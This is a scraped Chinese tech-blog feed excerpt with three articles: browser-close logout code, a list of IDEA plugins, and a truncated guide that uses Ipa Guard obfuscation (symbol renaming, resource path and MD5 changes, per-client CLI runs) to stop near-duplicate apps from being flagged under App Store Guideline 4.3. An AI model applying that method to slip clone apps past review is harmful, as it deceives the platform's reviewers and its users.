                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">一、前言</h2>
<p>项目出于安全评测的要求，需要页面在浏览器及其标签页关闭的时候登出，保证每次进入系统都重新登录。
核心处理逻辑有如下几点：</p>
<ol>
<li>监听浏览器关闭事件</li>
<li>关闭时清除本地存储的token</li>
<li>关闭时调用登出接口保证后端redis中token被清除</li>
</ol>
<p>通过AI和网络搜索 给出的方案，很快就实现了。但在自测验证过程中，发现有两个费劲周折的问题。</p>
<ol>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fzh-CN%2Fdocs%2FWeb%2FAPI%2FWindow%2Fbeforeunload_event" target="_blank" title="https://developer.mozilla.org/zh-CN/docs/Web/API/Window/beforeunload_event" ref="nofollow noopener noreferrer">beforeunload 事件</a>在页面刷新时也会触发，而排除是刷新的情况 试了N种方案都不尽人意</li>
<li>标签页关闭后axios触发的登出请求 会被浏览器取消，后端接收不到。</li>
</ol>
<p>折腾一波后，最终都解决了，这里记录下解决方案。</p>
<h2 data-id="heading-1">二、解决方案</h2>
<h3 data-id="heading-2">2.1 标签页关闭时登出，但排除刷新的场景</h3>
<p>在<code>unload</code>事件中增加刷新情况的判断。除了下面代码中时间差的判断方法外，还尝试过<code>performance.navigation</code>等方案，都无效。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">let</span> _beforeUnload_time = <span class="hljs-number">0</span>
<span class="hljs-keyword">let</span> _gap_time = <span class="hljs-number">0</span>
<span class="hljs-variable language_">window</span>.<span class="hljs-property">onbeforeunload</span> = <span class="hljs-function">() =&gt;</span> {
  _beforeUnload_time = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>().<span class="hljs-title function_">getTime</span>();
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"beforeUnload_time"</span>, _beforeUnload_time);
};

<span class="hljs-variable language_">window</span>.<span class="hljs-property">onunload</span> = <span class="hljs-function">(<span class="hljs-params">event</span>) =&gt;</span> {
  _gap_time = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>().<span class="hljs-title function_">getTime</span>() - _beforeUnload_time;
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"gap_time"</span>, _gap_time);
<span class="hljs-keyword">if</span> (_gap_time &lt;= <span class="hljs-number">5</span> || event.<span class="hljs-property">altKey</span>) {
    <span class="hljs-comment">// 执行关闭需要进行的操作，1. 清除本地缓存；2. 发送登出接口</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"xxxxxxx关闭"</span>);
  }<span class="hljs-keyword">else</span>{
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"页面刷新"</span>);
  }
};
</code></pre>
<h3 data-id="heading-3">2.2 登出请求，避免被浏览器取消</h3>
<p>Fetch的keepalive可以在页面卸载（如用户关闭标签页或跳转到新页面）后，确保请求仍能在后台完成的选项</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-title function_ invoke__">fetch</span>(<span class="hljs-string">'/api/logout'</span>, {
  <span class="hljs-attr">method</span>: <span class="hljs-string">'GET'</span>,
  <span class="hljs-attr">headers</span>: {
    <span class="hljs-string">'Authorization'</span>: token
  },
  <span class="hljs-attr">keepalive</span>: <span class="hljs-literal">true</span>, // 类似 sendBeacon 的行为
});
</code></pre>
<h3 data-id="heading-4">2.3 浏览器关闭再进入的场景</h3>
<p>基于sessionStorage做判断，存储在 <code>sessionStorage</code> 里面的数据在页面会话结束时会被浏览器自动清除。</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// 初次进入跳转登录页面</span>
<span class="hljs-keyword">if</span> (!sessionStorage.<span class="hljs-built_in">getItem</span>(<span class="hljs-string">"entered"</span>)) {
  location.hash = <span class="hljs-string">"#/login"</span>;
  sessionStorage.<span class="hljs-built_in">setItem</span>(<span class="hljs-string">"entered"</span>, <span class="hljs-string">"true"</span>);
}
</code></pre>
<h2 data-id="heading-5">三、参考资料</h2>
<ul>
<li><a href="https://juejin.cn/post/7356138322368184358" target="_blank" title="https://juejin.cn/post/7356138322368184358">chrome 判断当前是关闭浏览器还是刷新浏览器</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fzh-CN%2Fdocs%2FWeb%2FAPI%2FNavigator%2FsendBeacon" target="_blank" title="https://developer.mozilla.org/zh-CN/docs/Web/API/Navigator/sendBeacon" ref="nofollow noopener noreferrer">Navigator.sendBeacon()</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[IDEA插件]]></title>    <link>https://juejin.cn/post/7584013833993928738</link>    <guid>https://juejin.cn/post/7584013833993928738</guid>    <pubDate>2025-12-16T07:20:24.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7584013833993928738" data-draft-id="7584013833993879586" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="IDEA插件"/> <meta itemprop="keywords" content="Java"/> <meta itemprop="datePublished" content="2025-12-16T07:20:24.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="无名之辈J"/> <meta itemprop="url" content="https://juejin.cn/user/3672818779437239"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            IDEA插件
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3672818779437239/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    无名之辈J
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T07:20:24.000Z" title="Tue Dec 16 2025 07:20:24 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">一、GenerateAllSetter</h2>
<p>GenerateAllSetter 有助于为类中的所有属性生成 setter 方法。这可以在编写代码时节省时间和精力，同时也降低了出错的可能性。</p>
<h2 data-id="heading-1">二、Lombok</h2>
<p>Lombok：一个自动生成样板代码的 Java 库。</p>
<h2 data-id="heading-2">三、translation</h2>
<p>对于英文不太好的同学是一个非常不错的工具，不用再将单词复制到单独的翻译工具。当然对于生僻的单词更是克星!</p>
<h2 data-id="heading-3">四、MyBatisX</h2>
<p>Mybatis作为常用的ORM框架，受众还是非常广的，MyBatisX插件是一款辅助 IDEA 快速开发 MyBatis 的插件，能快帮你快速的定位到某个Mapper方法中对应的SQL是哪个。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[使用 Ipa Guard 应对 App Store 4.3 风险的一些实践]]></title>    <link>https://juejin.cn/post/7584307642983514153</link>    <guid>https://juejin.cn/post/7584307642983514153</guid>    <pubDate>2025-12-16T07:24:02.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7584307642983514153" data-draft-id="7584059298696249385" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="使用 Ipa Guard 应对 App Store 4.3 风险的一些实践"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-12-16T07:24:02.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="开心就好2025"/> <meta itemprop="url" content="https://juejin.cn/user/3850962908492660"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            使用 Ipa Guard 应对 App Store 4.3 风险的一些实践
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3850962908492660/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    开心就好2025
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T07:24:02.000Z" title="Tue Dec 16 2025 07:24:02 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在 iOS 上架过程中，<strong>Guideline 4.3（Spam / 重复应用）</strong> 是很多团队反复踩中的问题，尤其集中在以下场景：</p>
<ul>
<li>多马甲 / 多地区版本</li>
<li>定制化交付的行业 App</li>
<li>白标（White-label）项目</li>
<li>同一代码基线的多客户版本</li>
<li>渠道包 / 联运包</li>
<li>外包项目统一模板交付</li>
</ul>
<p>需要明确的是：
<strong>4.3 并不是“代码违规”，而是“应用之间相似度过高”带来的审核风险。</strong>
因此，规避 4.3 的核心目标不是“隐藏代码”，而是<strong>在技术层面降低应用之间的可识别相似性</strong>。</p>
<p>本文从审核判定逻辑出发，结合工程实践，说明如何通过 <strong>Ipa Guard</strong> 配合其他工具，在不改动或尽量少改源码的前提下，<strong>降低被判定为重复应用的概率</strong>。</p>
<hr/>
<h2 data-id="heading-0">一、4.3 审核的本质：Apple 在比对什么？</h2>
<p>从大量被拒案例总结，4.3 通常并不只看 UI，而是综合多个维度：</p>
<h3 data-id="heading-1">常见判定信号包括（并非公开标准）：</h3>
<ul>
<li>二进制结构高度一致</li>
<li>类名 / 方法名 / 符号结构高度相似</li>
<li>资源文件结构、命名高度一致</li>
<li>H5 / JS 逻辑一致</li>
<li>包体结构、Framework 组合一致</li>
<li>启动流程、功能路径一致</li>
</ul>
<p>也就是说，即使你：</p>
<ul>
<li>换了图标</li>
<li>换了名称</li>
<li>换了文案</li>
</ul>
<p>如果 <strong>IPA 内部结构高度一致</strong>，仍然可能触发 4.3。</p>
<hr/>
<h2 data-id="heading-2">二、为什么“只改 UI / 文案”对 4.3 帮助有限？</h2>
<p>从工程角度看，很多团队规避 4.3 的手段集中在表层：</p>
<ul>
<li>换配色</li>
<li>换 logo</li>
<li>换应用名</li>
<li>换描述</li>
</ul>
<p>但在 IPA 结构层面，以下内容往往保持完全一致：</p>
<ul>
<li>Swift / ObjC 类名</li>
<li>方法签名</li>
<li>Framework 顺序</li>
<li>JSON / H5 文件结构</li>
<li>资源路径</li>
<li>MD5 特征</li>
</ul>
<p>这些恰恰是<strong>机器最容易比对的部分</strong>。</p>
<p>因此，真正有效的策略是：</p>
<blockquote>
<p><strong>在不影响功能的前提下，让每个 IPA 在“内部结构层面”产生差异。</strong></p>
</blockquote>
<hr/>
<h2 data-id="heading-3">三、规避 4.3 的技术目标拆解</h2>
<p>不谈“保证通过”，只谈<strong>降低风险</strong>，可拆解为四个目标：</p>
<ol>
<li><strong>降低二进制结构相似度</strong></li>
<li><strong>降低符号层相似度</strong></li>
<li><strong>降低资源结构相似度</strong></li>
<li><strong>让每个包具备独立可识别特征</strong></li>
</ol>
<p>这四点，正是 IPA 层处理工具能发挥作用的地方。</p>
<hr/>
<h2 data-id="heading-4">四、Ipa Guard 在规避 4.3 中承担的角色</h2>
<p>需要强调：
<strong>Ipa Guard 不是审核工具，也不是绕审工具。</strong>
它的作用是：<strong>在工程层面制造“合理差异”</strong>。</p>
<h3 data-id="heading-5">Ipa Guard 的适配点在于：</h3>
<ul>
<li>无需 iOS App 源码</li>
<li>直接作用于已编译的 IPA</li>
<li>可对每个包执行不同处理</li>
<li>支持自动化批量处理</li>
</ul>
<p>这使它非常适合以下场景：</p>
<ul>
<li>多客户定制</li>
<li>行业模板应用</li>
<li>多地区发行</li>
<li>联运 / 渠道包</li>
</ul>
<hr/>
<h2 data-id="heading-6">五、从工程角度看：Ipa Guard 能改变哪些相似度</h2>
<h3 data-id="heading-7">符号层差异（Swift / ObjC）</h3>
<p>通过 IPA 级混淆，可以让：</p>
<ul>
<li>类名</li>
<li>方法名</li>
<li>变量名</li>
</ul>
<p>在不同包中产生<strong>完全不同的映射结果</strong>。</p>
<p>即使源码相同，最终 IPA 中的符号结构也会不同。</p>
<hr/>
<h3 data-id="heading-8">资源结构差异（非常关键）</h3>
<p>Ipa Guard 可对以下资源进行处理：</p>
<ul>
<li>JSON</li>
<li>H5 / JS</li>
<li>图片</li>
<li>配置文件</li>
</ul>
<p>处理方式包括：</p>
<ul>
<li>文件名重写</li>
<li>路径扰动</li>
<li>MD5 修改</li>
</ul>
<p>结果是：
<strong>两个功能完全一致的 App，在资源结构层面已不再一致。</strong></p>
<hr/>
<h3 data-id="heading-9">包体内部指纹差异</h3>
<p>当：</p>
<ul>
<li>符号映射不同</li>
<li>资源路径不同</li>
<li>MD5 不同</li>
</ul>
<p>那么包体的整体指纹也会随之变化，这对降低“模板化识别”非常重要。</p>
<hr/>
<h2 data-id="heading-10">六、典型的“规避 4.3”工程流程（信息密集版）</h2>
<p>以下流程以 <strong>不改源码或最小改动源码</strong> 为前提。</p>
<hr/>
<h3 data-id="heading-11">Step 1：生成基础 IPA（同一代码基线）</h3>
<p>每个客户 / 版本生成一个基础 IPA。</p>
<hr/>
<h3 data-id="heading-12">Step 2：解析 IPA 结构</h3>
<pre><code class="hljs language-bash" lang="bash">ipaguard_cli parse base.ipa -o sym.json
</code></pre>
<p>目的：</p>
<ul>
<li>获取符号与资源清单</li>
<li>为后续差异化处理提供依据</li>
</ul>
<hr/>
<h3 data-id="heading-13">Step 3：为每个 App 生成独立混淆策略</h3>
<p>常见做法：</p>
<ul>
<li>每个包使用不同的随机种子</li>
<li>不同客户启用不同混淆组合</li>
<li>对资源改名顺序进行差异化</li>
<li>保留必要的 SDK / Bridge 符号</li>
</ul>
<hr/>
<h3 data-id="heading-14">Step 4：执行 IPA 层差异化处理</h3>
<pre><code class="hljs language-bash" lang="bash">ipaguard_cli protect base.ipa \
  -c sym.json \
  --js \
  --image \
  -o clientA.ipa
</code></pre>
